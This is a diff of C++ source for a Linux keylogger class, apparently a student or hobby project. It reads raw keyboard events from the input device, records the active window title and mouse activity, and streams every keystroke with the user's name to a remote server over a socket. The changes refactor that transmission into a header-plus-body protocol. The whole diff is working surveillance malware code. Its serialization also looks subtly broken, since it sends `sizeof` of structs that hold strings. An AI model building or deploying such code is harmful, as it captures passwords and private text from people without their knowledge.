@@ -230,27 +230,36 @@ void Key_logger::start(int port) {
         // int fd_async_keyboard = fileno(file_keyboard);
         std::vector<std::string> names;
         //вместо пуш передать строчку на сервер
+        message_header send_msg_keys_header;
         message send_msg_keys;
-        send_msg_keys.action = actions::KEYBOARD;
         send_msg_keys.keys = "\n\n" + CurrentDateTime();
         send_msg_keys.user_name = Name;
-        if (!try_send(_socket, send_msg_keys))
+        send_msg_keys_header.action = actions::KEYBOARD;
+        send_msg_keys_header.size = sizeof(send_msg_keys);
+        if (!try_send_header(_socket, send_msg_keys_header))
                _exit(EXIT_FAILURE);
-
+        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
+            _exit(EXIT_FAILURE);
         //names.push_back("\n\n" + CurrentDateTime());
-        int keys_fd; //дескриптор
-        struct input_event t;  
+        int keys_fd;
+        struct input_event t;
         struct input_event t_shift;
         keys_fd = check_path(open(DEV_PATH, O_RDONLY));
         bool flag_shift = false;
         bool flag_caps = false;
         std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
          //вместо пуш передать строчку на сервер
-        send_msg_keys.action = actions::KEYBOARD;
+
         send_msg_keys.keys = proc_name;
         send_msg_keys.user_name = Name;
-        if (!try_send(_socket, send_msg_keys))
-               _exit(EXIT_FAILURE); 
+
+        send_msg_keys_header.action = actions::KEYBOARD;
+        send_msg_keys_header.size = sizeof(send_msg_keys);
+
+        if (!try_send_header(_socket, send_msg_keys_header))
+               _exit(EXIT_FAILURE);
+        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
+            _exit(EXIT_FAILURE);
         //names.push_back(proc_name);
         #pragma endregion
         
@@ -293,8 +302,9 @@ void Key_logger::start(int port) {
     auto write_flag_unactive = true;
     std::vector<std::string> active_mouse;
     message send_msg_mouse;
-    send_msg_mouse.action = actions::MOUSE;
+    message_header send_msg_mouse_header;
     send_msg_mouse.user_name = Name;
+    send_msg_mouse_header.action = actions::MOUSE;
     #pragma endregion
 
         while (true)
@@ -303,8 +313,13 @@ void Key_logger::start(int port) {
             std::string message = Date_Time();
             send_msg_mouse.mice = message.append(" Mouse is UNACTIVE\n");
             //active_mouse.push_back(message.append(" Mouse is UNACTIVE\n"));
-            if (!try_send(_socket, send_msg_mouse))
+            send_msg_mouse_header.size = sizeof(send_msg_mouse);
+
+            if (!try_send_header(_socket, send_msg_mouse_header))
                 _exit(EXIT_FAILURE);
+            if (!try_send(_socket, send_msg_mouse, sizeof(send_msg_mouse)))
+                _exit(EXIT_FAILURE);
+
             write_flag_active = false;
             write_flag_unactive = true;
             first = time(NULL);
@@ -342,8 +357,11 @@ void Key_logger::start(int port) {
             if (write_flag_unactive == true) {
                 std::string message = Date_Time();
                 send_msg_mouse.mice = message.append(" Mouse is ACTIVE\n");
-            
-                if (!try_send(_socket, send_msg_mouse))
+
+                send_msg_mouse_header.size = sizeof(send_msg_mouse);
+                if (!try_send_header(_socket, send_msg_mouse_header))
+                    _exit(EXIT_FAILURE);
+                if (!try_send(_socket, send_msg_mouse, sizeof(send_msg_mouse)))
                     _exit(EXIT_FAILURE);
                 //active_mouse.push_back(message.append(" Mouse is ACTIVE\n"));
                 write_flag_unactive = false;
@@ -359,10 +377,14 @@ void Key_logger::start(int port) {
             std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
             if (current_name != proc_name)
             {
-                send_msg_keys.action = actions::KEYBOARD;
                 send_msg_keys.keys = "\n\n" + current_name;
                 send_msg_keys.user_name = Name;
-                if (!try_send(_socket, send_msg_keys))
+
+                send_msg_keys_header.action = actions::KEYBOARD;
+                send_msg_keys_header.size = sizeof(send_msg_keys);
+                if (!try_send_header(_socket, send_msg_keys_header))
+                    _exit(EXIT_FAILURE);
+                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                     _exit(EXIT_FAILURE);
                 //names.push_back("\n\n" + current_name);
                 proc_name = current_name;
@@ -386,32 +408,42 @@ void Key_logger::start(int port) {
 
                         if (t.value == 1 && isLetter(t.code))
                         {
-                            if (flag_shift == true && flag_caps == false)
+                            if ((flag_shift == true && flag_caps == false) || (flag_caps == true && flag_shift == false))
                             {
-                                 send_msg_keys.action = actions::KEYBOARD;
                                  send_msg_keys.keys = keys[t.code + 1000];
                                  send_msg_keys.user_name = Name;
-                                 if (!try_send(_socket, send_msg_keys))
+
+                                 send_msg_keys_header.action = actions::KEYBOARD;
+                                 send_msg_keys_header.size = sizeof(send_msg_keys);
+
+                                if (!try_send_header(_socket, send_msg_keys_header))
+                                    _exit(EXIT_FAILURE);
+                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                     _exit(EXIT_FAILURE);
                                 //names.push_back(keys[t.code + 1000]);
                                 std::cout << keys[t.code + 1000] << std::endl;
                             }
-                            else if (flag_caps == true && flag_shift == false)
-                            {
-                                send_msg_keys.action = actions::KEYBOARD;
-                                send_msg_keys.keys = keys[t.code + 1000];
-                                send_msg_keys.user_name = Name;
-                                if (!try_send(_socket, send_msg_keys))
-                                    _exit(EXIT_FAILURE);
+                            //else if (flag_caps == true && flag_shift == false)
+                            //{
+                                //send_msg_keys.action = actions::KEYBOARD;
+                                //send_msg_keys.keys = keys[t.code + 1000];
+                                //send_msg_keys.user_name = Name;
+                                //if (!try_send(_socket, send_msg_keys))
+                                    //_exit(EXIT_FAILURE);
                                 //names.push_back(keys[t.code + 1000]);
-                                std::cout << keys[t.code + 1000] << std::endl;
-                            }
+                                //std::cout << keys[t.code + 1000] << std::endl;
+                            //}
                             else
                             {
-                                send_msg_keys.action = actions::KEYBOARD;
                                 send_msg_keys.keys = keys[t.code];
                                 send_msg_keys.user_name = Name;
-                                 if (!try_send(_socket, send_msg_keys))
+
+                                send_msg_keys_header.action = actions::KEYBOARD;
+                                send_msg_keys_header.size = sizeof(send_msg_keys);
+
+                                if (!try_send_header(_socket, send_msg_keys_header))
+                                    _exit(EXIT_FAILURE);
+                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                     _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code]);
                                 std::cout << "key3 " << keys[t.code] << std::endl;
@@ -421,10 +453,15 @@ void Key_logger::start(int port) {
                         {
                             if (flag_shift == true)
                             {
-                                send_msg_keys.action = actions::KEYBOARD;
                                 send_msg_keys.keys = keys[t.code + 1000];
                                 send_msg_keys.user_name = Name;
-                                 if (!try_send(_socket, send_msg_keys))
+
+                                send_msg_keys_header.action = actions::KEYBOARD;
+                                send_msg_keys_header.size = sizeof(send_msg_keys);
+
+                                if (!try_send_header(_socket, send_msg_keys_header))
+                                    _exit(EXIT_FAILURE);
+                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                     _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code + 1000]);
                                 std::cout  << keys[t.code + 1000] << std::endl;
@@ -433,10 +470,15 @@ void Key_logger::start(int port) {
                             }
                             if (flag_shift == false)
                             {
-                                send_msg_keys.action = actions::KEYBOARD;
                                 send_msg_keys.keys = keys[t.code];
                                 send_msg_keys.user_name = Name;
-                                 if (!try_send(_socket, send_msg_keys))
+
+                                send_msg_keys_header.action = actions::KEYBOARD;
+                                send_msg_keys_header.size = sizeof(send_msg_keys);
+
+                                if (!try_send_header(_socket, send_msg_keys_header))
+                                    _exit(EXIT_FAILURE);
+                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                     _exit(EXIT_FAILURE);
                                 names.push_back(keys[t.code]);
                                 std::cout  << keys[t.code] << std::endl;
@@ -445,21 +487,22 @@ void Key_logger::start(int port) {
                     }
 
                     if (t.code == 1001){
-                        send_msg_keys.action = actions::KEYBOARD;
                         send_msg_keys.keys = "\n" + CurrentDateTime();
-                        if (!try_send(_socket, send_msg_keys))
+
+                        send_msg_keys_header.action = actions::KEYBOARD;
+                        send_msg_keys_header.size = sizeof(send_msg_keys);
+
+                        if (!try_send_header(_socket, send_msg_keys_header))
                             _exit(EXIT_FAILURE);
-                        send_msg_keys.action = actions::END;
+                        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
+                            _exit(EXIT_FAILURE);
+                        send_msg_keys_header.action = actions::END;
                         std::cout << t.code << std::endl;
                         std::cout << "Exit" << std::endl;
                         break;
                     }
-                
             }
-            
-
         }
-        
         close(keys_fd);
         XCloseDisplay(display);
     }
